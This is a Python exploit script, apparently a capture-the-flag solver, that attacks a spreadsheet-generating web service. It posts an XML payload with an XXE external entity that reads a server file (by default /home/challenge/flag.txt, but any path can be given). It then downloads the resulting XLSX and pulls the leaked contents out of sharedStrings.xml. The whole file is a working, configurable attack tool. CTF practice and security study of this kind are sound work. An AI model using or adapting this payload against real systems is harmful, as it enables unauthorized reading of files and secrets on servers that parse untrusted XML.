#!/usr/bin/env python3

import argparse
import base64
from datetime import datetime
import json
import os
import platform
import random
import re
import requests
import string
import zipfile

class Executor:
    def __init__(self, baseurl:str, targetfile:str):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")

        if not(isinstance(targetfile,str)):
            raise TypeError(f"targetfile must be a string. got {type(targetfile)}")

        targetfile = targetfile.strip()
        if targetfile[0] == "/":
            if len(targetfile) < 2:
                raise ValueError("targetfile must be a file, not \"/\"")
            targetfile = targetfile[1:]

        self.__baseurl = baseurl
        self.__createroute = "createSheets"
        self.__sheetsroute = "finishedSheets"
        self.__targetfile = targetfile
        self.__timeout = 15
        return

    def __extract_flag(self, targetfile:str):
        flag = str()
        flagfile = str()
        flagfiledat = str()
        flagpat = "flag{.*}"
        message = str()
        success = bool()

        try:
            if not(isinstance(targetfile,str)):
                raise TypeError(f"targetfile must be a string. got {type(targetfile)}")

            targetdir = ".".join(targetfile.split("/")[-1].split(".")[:-1])

            ############################################################
            #
            # because an XLSX file is special ZIP file, we can extract
            # the contents of the XLSX file by unzipping it and saving
            # it to a local directory. we can then parse out the content
            # and focus on what we are interested in. this allows us to
            # process the XLSX file without needing Excel, LibreOffice,
            # OpenOffice, etc.
            #
            ############################################################
            with zipfile.ZipFile(targetfile, "r") as zfile:
                zfile.extractall(targetdir)

            flagfile = f"{targetdir}/xl/sharedStrings.xml"

            ############################################################
            #
            # the file within this ZIP directory we are interested in is
            # the sharedStrings.xml file. this is where the contents of
            # the leaked file will be stored.
            #
            ############################################################
            with open(flagfile,"r") as fptr:
                flagfiledat = fptr.read()

            ############################################################
            #
            # use regular expressions to search for the flag within
            # the sharedStrings.xml file content. 
            #
            ############################################################
            flag, success, message = FindFlag(flagfiledat, flagpat)
            if not(success):
                raise ValueError(message)

            message = "flag successfully acquired"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (flag, success, message)

    def __get_malicious_sheet(self):
        message = str()
        regpat = f"<a href=\"/finishedSheets/([0-9_]+.xlsx)\">"
        sheetlocation = str()
        success = bool()
        targeturl = f"{self.__baseurl}/{self.__sheetsroute}"

        try:
            ############################################################
            #
            # make a GET request to /finishedSheets route to view the
            # links for all the XLSX files created by /createSheets.
            #
            ############################################################
            resp = requests.get(targeturl, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"error finding sheets ({resp.status_code} {resp.reason})")

            ############################################################
            #
            # use regular expressions to parse out all the XLSX files.
            #
            # we are going to assume, because this function is called
            # immediately after we POST our malicious XML file, that
            # the most recent XLSX file is the one generated by our 
            # request. this can be determine by sorting the XLSX files
            # using the sort() command becuase the filenames are
            # determined by the time the POST request was processed by
            # the target server. the most recent file will be the last
            # file in the list after the sort() command is executed.
            #
            ############################################################
            reg = re.compile(regpat)
            matches = reg.findall(resp.text)
            if len(matches) < 1:
                raise ValueError("no xlsx files found")
            matches.sort()

            sheetlocation = matches[-1]

            targeturl = f"{targeturl}/{sheetlocation}"

            ############################################################
            #
            # make a GET request to the /finishedSheets/<targetfile>
            # route to pull down the contents of the file. the file's
            # contents will be saved locally if no error is encountered.
            #
            ############################################################
            resp = requests.get(targeturl, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"error downloading sheet ({resp.status_code} {resp.reason})")

            with open(sheetlocation, "wb") as fptr:
                fptr.write(resp.content)

            message = f"sheet successfully acquired and saved to \"{sheetlocation}\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (sheetlocation, success, message)

    def __make_malicious_sheet(self):
        message = str()
        success = bool()
        targeturl = str()
        xmlpayload = str()

        try:
            ############################################################
            #
            # build the XML payload that will be transmitted to the
            # target server. this will include an XXE injection that
            # will leak the contents of the target file.
            #
            ############################################################
            xmlpayload = "<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\n"
            xmlpayload = f"{xmlpayload}<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///{self.__targetfile}\"> ]>\n"
            xmlpayload = f"{xmlpayload}<sheet title=\"Dream Sheets\">\n"
            xmlpayload = f"{xmlpayload}<row><cell>Bed Size</cell><cell>&xxe;</cell></row>\n"
            xmlpayload = f"{xmlpayload}<row><cell>Color</cell><cell>#ffffff</cell></row>\n"
            xmlpayload = f"{xmlpayload}<row><cell>Thread Count</cell><cell>400</cell></row>\n"
            xmlpayload = f"{xmlpayload}<row><cell>Quantity</cell><cell>1</cell></row>\n"
            xmlpayload = f"{xmlpayload}</sheet>"

            targeturl = f"{self.__baseurl}/{self.__createroute}"

            ############################################################
            #
            # POST the malicious XML payload to /createSheets. this
            # will cause the target server to process the XXE and place
            # the contents of the file in the generated XLSX file.
            #
            ############################################################
            resp = requests.post(targeturl, data=xmlpayload, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"error creating sheet ({resp.status_code} {resp.reason})")

            message = "malicious sheet successfully created"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def attack(self):
        flag = str()
        message = str()
        success = bool()
        targetname = str()

        try:
            SysMsgNB("generating malicious sheet ...")
            success, message = self.__make_malicious_sheet()
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            SysMsgNB("grabbing malicious sheet ...")
            location, success, message = self.__get_malicious_sheet()
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            SysMsgNB("exploding xlsx file and checking for flag ...")
            flag, success, message = self.__extract_flag(location)
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            message = "attack completed successfully"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (flag, success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--file", help="file whose contents to include", type=str, dest="targetfile", default="/home/challenge/flag.txt")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    targetfile = args.targetfile

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    try:
        executor = Executor(baseurl, targetfile)
        flag, success, message = executor.attack()
        if not(success):
            raise ValueError(message)
        SucMsg(flag)
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()
